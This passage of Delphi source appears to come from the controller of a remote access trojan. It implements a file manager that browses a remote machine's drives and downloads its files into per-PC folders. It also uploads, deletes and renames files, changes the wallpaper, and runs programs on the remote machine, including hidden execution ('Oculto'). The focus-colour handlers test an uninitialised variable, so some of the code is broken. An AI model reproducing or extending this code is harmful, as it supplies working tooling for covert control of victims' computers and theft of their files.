      MS.Read(pchar(@RR)^, sizeof(RecordResult));

      if (string(RR.Find.cFileName) = '.') or (string(RR.Find.cFileName) = '') then continue;

      if RR.Find.dwFileAttributes and $00000010 <> 0 then
      begin
        Li := ListView1.Items.Add;
        Li.Caption := string(RR.Find.cFileName);
        Li.SubItems.Add(RR.TipoDeArquivo);
        Li.SubItems.Add(pchar(traduzidos[298]));

        if Li.Caption = '..' then
        begin
          Li.SubItems.Add(' ');
          Li.SubItems.Add(' ');
          Li.SubItems.Add(' ');
          Li.SubItems.Add(' ');
        end else
        begin
          Li.SubItems.Add(GetAttributes(RR.Find));
          Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftCreationTime))); // criação
          Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftLastAccessTime))); // Acesso
          Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftLastWriteTime))); // Modificação
        end;
        Li.SubItems.Add(' ');  // tamanho
        GetFileIcon(true, Imagelist1, ListView1.Items.Item[ListView1.Items.Count - 1], MyTempFolder, isSmall);
      end else
      begin
        TempInt := Int64(RR.Find.nFileSizeHigh) shl Int64(32) +    // calculate the size
          Int64(RR.Find.nFileSizeLow);

        Li := ListView1.Items.Add;
        Li.Caption := string(RR.Find.cFileName);
        Li.SubItems.Add(RR.TipoDeArquivo);
        Li.SubItems.Add(pchar(BytesSize(TempInt)));
        Li.SubItems.Add(GetAttributes(RR.Find));
        Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftCreationTime))); // criação
        Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftLastAccessTime))); // Acesso
        Li.SubItems.Add(ConverterData(FileTimeToDTime(RR.Find.ftLastWriteTime))); // Modificação
        Li.SubItems.Add(pchar(inttostr(TempInt)));
        GetFileIcon(false, Imagelist1, ListView1.Items.Item[ListView1.Items.Count - 1], MyTempFolder + Li.Caption, isSmall);
      end;
    end;
    MS.Free;
    ListView1.Items.EndUpdate;

    z := gettickcount - z;
    if DebugAtivo then AddDebug('Dir (' + Edit1.Text + ') Time(ms): ' + inttostr(z));

    EndUpdate1 := true;
    for z := 0 to high(ImageString) do ImageString[z] := '';

    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[307]);
    //Atualizar1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = THUMBNAIL then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    z := strtoint(Copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));

    TempStr := traduzidos[330] + ' "' + Copy(Recebido, 1, pos('|', Recebido) - 1) + '"';
    delete(Recebido, 1, pos('|', Recebido));

    ImageString[z] := recebido;
    TempStr := TempStr + ' ---> ' + BytesSize(length(recebido));

    S := TMemoryStream.Create;
    StrToStream(S, recebido);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);

    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;

    StatusBar1.Panels.Items[1].Text := TempStr;
    TempStr := ExtractFileName(TempStr);
    Label1.Caption := copy(TempStr, 1, pos('"', TempStr) - 1);
    //atualizar1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DOWNLOAD then
  begin
    AThreadTransfer := Athread;
    Delete(Recebido, 1, Pos('|', Recebido));
    TempStr := Copy(Recebido, 1, Pos('|', Recebido) - 1);
    Delete(Recebido, 1, Pos('|', Recebido));
    TempInt := StrToInt(Copy(Recebido, 1, Pos('|', Recebido) - 1));
    Descarga := TDescargaHandler.Create(AThreadTransfer, TempStr, TempInt, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + ExtractFileName(TempStr), ListView3, true);
    Descarga.callback := Self.TransferFinishedNotification;
    ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\');
    sleep(1000);
    Descarga.transferFile;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DOWNLOADREC then
  begin
    AThreadTransfer := Athread;
    Delete(Recebido, 1, Pos('|', Recebido));

    RecPath := Copy(Recebido, 1, Pos('|', Recebido) - 1);
    Delete(Recebido, 1, Pos('|', Recebido));
    if RecPath[length(RecPath)] <> '\' then RecPath := RecPath + '\';
    RecPath := replacestring(':', '', RecPath);

    TempStr := Copy(Recebido, 1, Pos('|', Recebido) - 1);
    Delete(Recebido, 1, Pos('|', Recebido));
    TempInt := StrToInt(Copy(Recebido, 1, Pos('|', Recebido) - 1));

    Descarga := TDescargaHandler.Create(AThreadTransfer, TempStr, TempInt, ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + RecPath + ExtractFileName(TempStr), ListView3, true);
    Descarga.callback := Self.TransferFinishedNotification;
    ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\' + RecPath);
    sleep(1000);
    Descarga.transferFile;
  end else

  if Copy(Recebido, 1, Pos('|', Recebido) - 1) = RESUMETRANSFER then
  begin
    AThreadTransfer := Athread;
    Delete(Recebido, 1, Pos('|', Recebido));

    Tempstr := Copy(Recebido, 1, Pos('|', Recebido) - 1);
    Delete(Recebido, 1, Pos('|', Recebido));

    TempInt := StrToInt(Copy(Recebido, 1, Pos('|', Recebido) - 1));

    for z := 0 to ListView3.Items.Count -1 do
    begin
      Descarga := TDescargaHandler(ListView3.Items[z].Data);
      if UpperCase(Descarga.Origen) = UpperCase(Tempstr) then
      begin
        Descarga.AThread := AThreadTransfer;
        Descarga.SizeFile := TempInt;
        sleep(1000);
        Descarga.ResumeTransfer;
        Exit;
      end;
    end;
  end else

  if Copy(Recebido, 1, Pos('|', Recebido) - 1) = UPLOAD then
  begin
    AThreadTransfer := Athread;
    Delete(Recebido, 1, Pos('|', Recebido));
    TempStr := Copy(Recebido, 1, Pos('|', Recebido) - 1);
    TempInt := MyGetFileSize(TempStr);
    Descarga := TDescargaHandler.Create(AThreadTransfer, TempStr, TempInt, '', ListView3, false);
    Descarga.UploadFile;
  end else

  if Copy(Recebido, 1, Pos('|', Recebido) - 1) = PROCURAR_ARQ then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    ListView2.Clear;
    ListView2.Items.BeginUpdate;
    EndUpdate2 := false;

    MS := TMemoryStream.Create;
    StrToStream(MS, Recebido);
    MS.Position := 0;

    while MS.Position < MS.Size do
    begin
      MS.Read(pchar(@RSR)^, sizeof(RecordSearchResult));

      TempInt := Int64(RSR.Find.nFileSizeHigh) shl Int64(32) +    // calculate the size
        Int64(RSR.Find.nFileSizeLow);

      Li := ListView2.Items.Add;
      Li.Caption := RSR.Dir + string(RSR.Find.cFileName);

      Li.SubItems.Add(RSR.TipoDeArquivo);
      Li.SubItems.Add(pchar(BytesSize(TempInt)));
      Li.SubItems.Add(GetAttributes(RSR.Find));
      Li.SubItems.Add(ConverterData(FileTimeToDTime(RSR.Find.ftCreationTime))); // criação
      Li.SubItems.Add(ConverterData(FileTimeToDTime(RSR.Find.ftLastAccessTime))); // Acesso
      Li.SubItems.Add(ConverterData(FileTimeToDTime(RSR.Find.ftLastWriteTime))); // Modificação
      Li.SubItems.Add(pchar(inttostr(TempInt)));
      GetFileIcon2(false, Imagelist2, ListView2.Items.Item[ListView2.Items.Count - 1], Li.Caption, isSmall);
    end;
    MS.Free;

    ListView2.Items.EndUpdate;
    EndUpdate2 := true;

    edit2.Enabled := true;
    bitbtn2.Enabled := edit2.Enabled;
    bitbtn3.Enabled := not edit2.Enabled;
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[307]);
  end else

  if Copy(Recebido, 1, Pos('|', Recebido) - 1) = PROCURARERROR then
  begin
    edit2.Enabled := true;
    bitbtn2.Enabled := edit2.Enabled;
    bitbtn3.Enabled := not edit2.Enabled;
    ListView2.Clear;
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[342]);
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = THUMBNAILSEARCH then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    z := strtoint(Copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));

    TempStr := traduzidos[330] + ' "' + Copy(Recebido, 1, pos('|', Recebido) - 1) + '"';
    delete(Recebido, 1, pos('|', Recebido));

    ImageStringSearch[z] := recebido;
    TempStr := TempStr + ' ---> ' + BytesSize(length(recebido));

    S := TMemoryStream.Create;
    StrToStream(S, recebido);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);

    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;

    StatusBar1.Panels.Items[1].Text := TempStr;
    TempStr := ExtractFileName(TempStr);
    Label1.Caption := copy(TempStr, 1, pos('"', TempStr) - 1);

    edit2.Enabled := true;
    bitbtn2.Enabled := edit2.Enabled;
    bitbtn3.Enabled := not edit2.Enabled;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = MULTITHUMBNAILSEARCH then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    while pos(DelimitadorDeImagem, Recebido) <> 0 do
    begin
      z := strtoint(Copy(Recebido, 1, pos('|', Recebido) - 1));
      delete(Recebido, 1, pos('|', Recebido));

      ImageStringSearch[z] := copy(recebido, 1, pos(DelimitadorDeImagem, Recebido) - 1);
      delete(Recebido, 1, pos(DelimitadorDeImagem, Recebido) - 1);
      delete(Recebido, 1, length(DelimitadorDeImagem));
    end;

    S := TMemoryStream.Create;
    StrToStream(S, ImageStringSearch[z]);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);

    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;

    StatusBar1.Panels.Items[1].Text := traduzidos[347];
    Label1.Caption := '';

    edit2.Enabled := true;
    bitbtn2.Enabled := edit2.Enabled;
    bitbtn3.Enabled := not edit2.Enabled;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = MULTITHUMBNAIL then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    while pos(DelimitadorDeImagem, Recebido) <> 0 do
    begin
      z := strtoint(Copy(Recebido, 1, pos('|', Recebido) - 1));
      delete(Recebido, 1, pos('|', Recebido));

      ImageString[z] := copy(recebido, 1, pos(DelimitadorDeImagem, Recebido) - 1);
      delete(Recebido, 1, pos(DelimitadorDeImagem, Recebido) - 1);
      delete(Recebido, 1, length(DelimitadorDeImagem));
    end;

    S := TMemoryStream.Create;
    StrToStream(S, ImageString[z]);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);

    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;

    StatusBar1.Panels.Items[1].Text := traduzidos[347];
    //Atualizar1.Enabled := true;
    Label1.Caption := '';
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = THUMBNAILERROR then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[352];
    //Atualizar1.Enabled := true;
    Label1.Caption := '';
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = THUMBNAILSEARCHERROR then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[352];
    Label1.Caption := '';

    edit2.Enabled := true;
    bitbtn2.Enabled := edit2.Enabled;
    bitbtn3.Enabled := not edit2.Enabled;
  end else





  begin

  end;
  if PageControl1.ActivePage = tabsheet1 then FilesDirCount(Listview1) else FilesDirCount(Listview2);
end;

procedure TFormFileManager.FormCreate(Sender: TObject);
begin
  FormPrincipal.ImageListIcons.GetBitmap(254, bitbtn1.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(296, bitbtn2.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(279, bitbtn3.Glyph);
  ListView1.DoubleBuffered := true;
  ListView2.DoubleBuffered := true;
  ListView3.DoubleBuffered := true;
  edit1.Clear;
  combobox1.Items.Clear;
end;

procedure TFormFileManager.Atualizar1Click(Sender: TObject);
var
  Pasta: string;
begin
  //if Atualizar1.Enabled = false then
  //begin
  //  messagedlg(pchar(traduzidos[297]), mtWarning, [mbOK], 0);
  //  exit;
  //end;

  if (edit1.Text = '') or
     (combobox1.Items.Count <= 0) then
  begin
    EnviarString(Servidor.Athread, LISTAR_DRIVES + '|', true);
    //Atualizar1.Enabled := false;
  end else
  begin
    if (DiretorioSelecionado = '') and (Edit1.Text <> '') then DiretorioSelecionado := Edit1.Text;
    pasta := DiretorioSelecionado;
    DiretorioSelecionado := '';

    if pasta[length(pasta)] <> '\' then pasta := pasta + '\';
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + Pasta + '|', true);
    //Atualizar1.Enabled := false;
  end;
  StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);
  ListView1.SetFocus;
end;

procedure TFormFileManager.ComboBox1KeyPress(Sender: TObject;
  var Key: Char);
begin
  key := #0;
end;

procedure TFormFileManager.Edit1Enter(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clSkyBlue;
  if (Ctrl is TListView) then
  TListView(Ctrl).Color := clSkyBlue;
  if (Ctrl is TListViewEx) then
  TListViewEx(Ctrl).Color := clSkyBlue;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clSkyBlue;
  if (Ctrl is TListBox) then
  TListBox(Ctrl).Color := clSkyBlue;
end;

procedure TFormFileManager.Edit1Exit(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clWindow;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clWindow;
  if (Ctrl is TListView) then
  TListView(Ctrl).Color := clWindow;
  if (Ctrl is TListViewEx) then
  TListViewEx(Ctrl).Color := clWindow;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clWindow;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clWindow;
  if (Ctrl is TListBox) then
  TListBox(Ctrl).Color := clWindow;
end;

procedure TFormFileManager.ComboBox1Change(Sender: TObject);
begin
  //if Atualizar1.Enabled = false then
  //begin
  //  messagedlg(pchar(traduzidos[297]), mtWarning, [mbOK], 0);
  //  exit;
  //end;

  if Combobox1.Text = '%WIN%' then
  begin
    edit1.Text := 'c:\windows\';
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + '%WIN%' + '|', true);
  end else
  if Combobox1.Text = '%SYS%' then
  begin
    edit1.Text := 'c:\windows\system32\';
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + '%SYS%' + '|', true);
  end else
  if Combobox1.Text = '%RECENT%' then
  begin
    edit1.Text := 'RecentFiles';
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + '%RECENT%' + '|', true);
  end else
  if Combobox1.Text = '%DESKTOP%' then
  begin
    edit1.Text := 'Desktop';
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + '%DESKTOP%' + '|', true);
  end else
  begin
    if pos(':', Combobox1.Text) > 1 then
    edit1.Text := copy(Combobox1.Text, 1, pos('\', Combobox1.Text)) // ex.: c:\
    else
    begin
      edit1.Text := Combobox1.Text;
      if edit1.Text[length(edit1.Text)] <> '\' then edit1.Text := edit1.Text + '\';
    end;
    EnviarString(Servidor.Athread, LISTAR_ARQUIVOS + '|' + edit1.Text + '|', true);
  end;
  StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);
  ListView1.SetFocus;
  //atualizar1.Enabled := false;
end;

procedure TFormFileManager.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
  if key = #13 then Atualizar1.Click;
end;

procedure TFormFileManager.ListView1DblClick(Sender: TObject);
var
  TempStr: string;
begin
  if ListView1.Selected.SubItems.Strings[1] <> pchar(traduzidos[298]) then exit;
  if ListView1.Selected.Caption = '..' then
  begin
    if length(edit1.Text) > 3 then
    begin
      TempStr := Edit1.Text;
      if tempstr[length(tempstr)] = '\' then delete(tempstr, length(tempstr), 1);
      tempstr := copy(tempstr, 1, LastDelimiter('\', Tempstr));
      Edit1.Text := tempstr;
    end;
  end else
  DiretorioSelecionado := edit1.Text + ListView1.Selected.Caption + '\';

  Atualizar1.Click;
end;

procedure TFormFileManager.FormShow(Sender: TObject);
begin
  EndUpdate1 := true;
  EndUpdate2 := true;
  Listarpastascompartilhadasnarede1.Enabled := true;

  Label1.Caption := '';
  edit1.SetFocus;
  StatusBar1.Panels.Items[0].Text := traduzidos[401] + ': ' + '0' + ' --- ' + traduzidos[402] + ': ' + '0';
  StatusBar1.Panels.Items[1].Text := '';

  edit2.Clear;
  bitbtn3.Enabled := false;
  bitbtn2.Enabled := not bitbtn3.Enabled;
  edit2.Enabled := bitbtn2.Enabled;

  //atualizar1.Enabled := true;
  if (combobox1.Items.Count <= 0) and
     (edit1.Text = '') then Atualizar1.Click;
  AtualizarStrings;
end;

procedure TFormFileManager.BitBtn1Click(Sender: TObject);
begin
  Atualizar1.Click;
end;

procedure TFormFileManager.Downloads1Click(Sender: TObject);
begin
  ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\');
  Shellexecute(0, 'open', 'explorer.exe', pchar(ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\'), pchar(extractfilepath(paramstr(0))), sw_normal);
end;

procedure TFormFileManager.Normal1Click(Sender: TObject);
var
  name: string;
begin
  name := '';
  if inputquery(pchar(traduzidos[308]), pchar(traduzidos[309]), name) then
  EnviarString(Servidor.Athread, EXEC_NORMAL + '|' + edit1.Text + ListView1.Selected.Caption + '|' + name + '|', true) else
  EnviarString(Servidor.Athread, EXEC_NORMAL + '|' + edit1.Text + ListView1.Selected.Caption + '|' + ' ' + '|', true);
end;

procedure TFormFileManager.Oculto1Click(Sender: TObject);
var
  name: string;
begin
  name := '';
  if inputquery(pchar(traduzidos[308]), pchar(traduzidos[309]), name) then
  EnviarString(Servidor.Athread, EXEC_INV + '|' + edit1.Text + ListView1.Selected.Caption + '|' + name + '|', true) else
  EnviarString(Servidor.Athread, EXEC_INV + '|' + edit1.Text + ListView1.Selected.Caption + '|' + ' ' + '|', true);
end;

procedure TFormFileManager.Deletar1Click(Sender: TObject);
var
  ToDelete: string;

  TempStrDIR, TempStrFILE: string;
  i: integer;
begin
  if listview1.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[346]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    if copy(edit1.Text, length(edit1.Text), 1) <> '\' then edit1.Text := edit1.Text + '\';

    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] = traduzidos[298]) then
      TempStrDIR := TempStrDIR + Edit1.Text + ListView1.Items.Item[i].Caption + '|' else
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStrFILE := TempStrFILE + Edit1.Text + ListView1.Items.Item[i].Caption + '|';
    end;
    if TempStrDIR <> '' then
    begin
      TempStrDIR := MULTIDELETAR_DIR + '|' + TempStrDIR;
      EnviarString(Servidor.Athread, TempStrDIR);
      sleep(500);
    end;
    if TempStrFILE <> '' then
    begin
      TempStrFILE := MULTIDELETAR_ARQ + '|' + TempStrFILE;
      EnviarString(Servidor.Athread, TempStrFILE);
    end;
    exit;
  end;




  if listview1.Selected.SubItems.Strings[1] = pchar(traduzidos[298]) then
  begin
    if copy(edit1.Text, length(edit1.Text), 1) <> '\' then
    ToDelete := edit1.Text + '\' + listview1.Selected.Caption else
    ToDelete := edit1.Text + listview1.Selected.Caption;
    if messagedlg(pchar(traduzidos[310] + ' "' + todelete + '\"'), mtConfirmation, [mbYes, mbNo], 0) = idno then exit;
    EnviarString(Servidor.Athread, DELETAR_DIR + '|' + ToDelete + '|', true);
  end else
  begin
    if copy(edit1.Text, length(edit1.Text), 1) <> '\' then
    ToDelete := edit1.Text + '\' + listview1.Selected.Caption else
    ToDelete := edit1.Text + listview1.Selected.Caption;
    if messagedlg(pchar(traduzidos[310] + ' "' + todelete + '"'), mtConfirmation, [mbYes, mbNo], 0) = idno then exit;
    EnviarString(Servidor.Athread, DELETAR_ARQ + '|' + ToDelete + '|', true);
  end
end;

procedure TFormFileManager.Renomear1Click(Sender: TObject);
var
  Novonome: string;
begin
  Novonome := listview1.Selected.Caption;
  if inputquery(pchar(traduzidos[311]), pchar(traduzidos[312]), Novonome) = true then
  if listview1.Selected.SubItems.Strings[1] = traduzidos[298] then
  EnviarString(Servidor.Athread, RENOMEAR_DIR + '|' + edit1.Text + listview1.Selected.Caption + '|' + edit1.Text + Novonome + '|', true)
  else
  EnviarString(Servidor.Athread, RENOMEAR_ARQ + '|' + edit1.Text + listview1.Selected.Caption + '|' + edit1.Text + Novonome + '|', true)
end;

procedure TFormFileManager.CopiarCtrlC1Click(Sender: TObject);
begin
  PastaOrigem := edit1.Text;
  if PastaOrigem[length(PastaOrigem)] <> '\' then PastaOrigem := PastaOrigem + '\';
  ToCopy := listview1.Selected.Caption;
  listviewcaption := listview1.Selected.Caption;
  if listview1.Selected.SubItems.Strings[1] = pchar(traduzidos[298]) then
  ToCopy := COPIAR_PASTA + '|' + PastaOrigem + '|' + ToCopy else
  ToCopy := COPIAR_ARQ + '|' + PastaOrigem + '|' + ToCopy;
end;

procedure TFormFileManager.ColarCtrlV1Click(Sender: TObject);
var
  i: integer;
begin
  if ToCopy = '' then exit;
  
  if edit1.Text = '' then exit;

  for i := 0 to listview1.Items.Count - 1 do
  begin
    if (listview1.Items.Item[i].Caption = listviewcaption) and (listview1.items.Item[i].SubItems.Strings[1] = traduzidos[298]) then
    if messagedlg(pchar(traduzidos[313]), mtConfirmation, [mbYES, mbNO], 0) = idNo then
    begin
      break;
      exit;
    end else break;
  end;

  PastaDest := edit1.Text;
  if PastaDest[length(pastadest)] <> '\' then PastaDest := PastaDest + '\';

  EnviarString(Servidor.Athread, ToCopy + '|' + PastaDest + '|');
  ToCopy := '';
  PastaDest := '';
  PastaOrigem := '';
end;


procedure TFormFileManager.Criarpasta1Click(Sender: TObject);
var
  NomePasta: string;
begin
  NomePasta := traduzidos[314];
  if inputquery(pchar(traduzidos[315]), pchar(traduzidos[316]), NomePasta) = true then
  if NomePasta <> '' then
  begin
    if copy(edit1.Text, length(edit1.Text), 1) <> '\' then
    NomePasta := edit1.Text + '\' + NomePasta else
    NomePasta := edit1.Text + NomePasta;
    EnviarString(Servidor.Athread, CRIAR_PASTA + '|' + NomePasta + '|', true);
  end else
  MessageDlg(pchar(traduzidos[317]), mtWarning, [mbok], 0)
end;

procedure TFormFileManager.Definircomopapeldeparede1Click(Sender: TObject);
begin
  EnviarString(Servidor.Athread, DESKTOP_PAPER + '|' + edit1.Text + listview1.Selected.Caption + '|', true);
end;

function TFormFileManager.IsImageFile(Arquivo: string): boolean;
var
  i: integer;
begin
  result := false;
  for i := 0 to high(ImgType) do
  begin
    if lowercase(ExtractfileExt(Arquivo)) = ImgType[i] then
    begin
      result := true;
      break;
    end;
  end;
end;

procedure TFormFileManager.Visualizarimagem1Click(Sender: TObject);
var
  i, k: integer;
  TempStr: string;
begin
  if listview1.SelCount > 1 then
  begin
    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) then
      begin
        if IsImageFile(ListView1.Items.Item[i].Caption) = true then
        begin
          for k := 1 to high(ImageString) do if ImageString[k] = '' then break;
          ImageString[k] := ' ';
          ListView1.Items.Item[i].Data := TObject(k);
          TempStr := TempStr + inttostr(k) + '|' + edit1.Text + ListView1.Items.Item[i].Caption + '|';
        end;
      end;
    end;
    if TempStr <> '' then
    begin
      TempStr := MULTITHUMBNAIL + '|' + TempStr;

      EnviarString(Servidor.Athread, TempStr);
      StatusBar1.Panels.Items[1].Text := pchar(traduzidos[164]);
      //Atualizar1.Enabled := false;
    end;
    exit;
  end;

  if IsImageFile(ListView1.Selected.Caption) = true then
  begin
    for i := 1 to high(ImageString) do if ImageString[i] = '' then break;
    ImageString[i] := ' ';
    listview1.Selected.Data := TObject(i);
    EnviarString(Servidor.Athread, THUMBNAIL + '|' + inttostr(i) + '|' + edit1.Text + listview1.Selected.Caption + '|', true);
    //Atualizar1.Enabled := false;
  end;
end;

procedure TFormFileManager.ListView1SelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
var
  s: TMemoryStream;
  j: TJpegImage;
  BitMap: TBitmap;
begin
  if listview1.Selected = nil then exit;

  if (listview1.Selected.Data <> nil) and
     (length(ImageString[cardinal(listview1.Selected.Data)]) > 1) then
  begin
    S := TMemoryStream.Create;
    StrToStream(S, ImageString[cardinal(listview1.Selected.Data)]);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);
    S.Free;
    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;
    label1.Caption := listview1.Selected.Caption;
  end else
  begin
    j := TJpegImage.Create;
    S := TMemoryStream.Create;
    FormPrincipal.ImageStream.Position := 0;
    S.CopyFrom(FormPrincipal.ImageStream, FormPrincipal.ImageStream.Size);
    S.Position := 0;
    j.LoadFromStream(S);
    S.Free;
    BitMap := tbitmap.Create;
    BitMap.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(BitMap);
    BitMap.Free;
    label1.Caption := '';
  end;
end;

procedure TFormFileManager.Baixararquivo1Click(Sender: TObject);
var
  i:integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;

  TempStr: string;
begin
  if listview1.SelCount > 1 then
  begin
    if MessageDlg(pchar(Traduzidos[345]), mtConfirmation, [mbYes, mbNo], 0) = idNo then exit;
    for i := 0 to Listview1.Items.Count - 1 do
    begin
      if (listview1.Items.Item[i].Selected = true) and
         (ListView1.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      TempStr := TempStr + Edit1.Text + ListView1.Items.Item[i].Caption + '|';
    end;
    TempStr := MULTIDOWNLOAD + '|' + TempStr;
    EnviarString(Servidor.Athread, TempStr);
    exit;
  end;

  FilePath := Edit1.Text + ListView1.Selected.Caption;

  for i := 0 to ListView3.Items.Count -1 do
  begin
    Descarga := TDescargaHandler(ListView3.Items[i].Data);
    if Descarga.Origen = FilePath then
    begin
      MessageDlg(pchar(Traduzidos[337]), mtWarning, [mbok], 0);
      Exit;
    end;
  end;
  EnviarString(Servidor.Athread, DOWNLOAD + '|' + FilePath + '|', true);
end;

procedure TFormFileManager.ListView3EndColumnResize(
  sender: TCustomListView; columnIndex, columnWidth: Integer);
var
  lv : TListViewEx;
  idx : integer;
  pb : TProgressBar;
begin
  lv := ListView3;

  //first column
  if columnIndex = 0 then
  begin
    for idx := 0 to -1 + lv.Items.Count do
    begin
      // o objeto zero foi porque eu salvei o progressbar na unittransfer como zero
      pb := TProgressBar(lv.Items[idx].SubItems.Objects[0]);
      pb.Left := columnWidth;
    end;
  end;

  //progress bar column
  if columnIndex = 1 then
  begin
    for idx := 0 to -1 + lv.Items.Count do
    begin
      pb := TProgressBar(lv.Items[idx].SubItems.Objects[0]);
      pb.Width := columnWidth;
    end;
  end;
end;

procedure TFormFileManager.DetenerDescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
begin
  if ListView3.Selected = nil then Exit;
  Descarga := TDescargaHandler(ListView3.Selected.Data);
  Descarga.CancelarDescarga;
end;

procedure TFormFileManager.ReanudarDescarga1Click(Sender: TObject);
var
  Descarga:TDescargaHandler;
begin
  Descarga := TDescargaHandler(ListView3.Selected.Data);
  if Descarga.Descargado = 0 then
  EnviarString(Servidor.Athread, RESUMETRANSFER + '|' + Descarga.Origen + '|' + '0' + '|', true) else
  EnviarString(Servidor.Athread, RESUMETRANSFER + '|' + Descarga.Origen + '|' + IntToStr(Descarga.Descargado) + '|', true);
end;

procedure TFormFileManager.Subiralprimerpuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: Integer;
begin
  for i := 0 to ListView3.Items.Count -1 do
    if ListView3.Items.Item[i].SubItems[0] = pchar(traduzidos[331]) then
    begin
      if ListView3.ItemIndex = i then Exit;
      Item := TListItem.Create(ListView3.Items);
      Item.Assign(ListView3.Selected);
      for j:= ListView3.Selected.Index downto i + 1 do
        ListView3.Items.Item[j] := ListView3.Items.Item[j - 1];
      ListView3.Items.Item[i] := Item;
      ListView3.ItemIndex := i;
      Item.Free;
      break;
    end;
end;

procedure TFormFileManager.Subir1Click(Sender: TObject);
var
  Item: TListItem;
  i: Integer;
begin
  if ListView3.ItemIndex = 0 then exit;
  i := ListView3.ItemIndex;
  if ListView3.Items.Item[i - 1].SubItems[0] = pchar(traduzidos[331]) then
  begin
    Item := TListItem.Create(ListView3.Items);
    Item.Assign(ListView3.Selected);
    ListView3.Items.Item[i] := ListView3.Items.Item[i - 1];
    ListView3.Items.Item[i - 1] := Item;
    ListView3.ItemIndex := i - 1;
    Item.Free;
  end;
end;


procedure TFormFileManager.Bajar1Click(Sender: TObject);
var
  Item: TListItem;
  i: Integer;
begin
  if ListView3.ItemIndex = ListView3.Items.Count - 1 then exit;
  i := ListView3.ItemIndex;
  if ListView3.Items.Item[i + 1].SubItems[0] = pchar(traduzidos[331]) then
  begin
    Item := TListItem.Create(ListView3.Items);
    Item.Assign(ListView3.Selected);
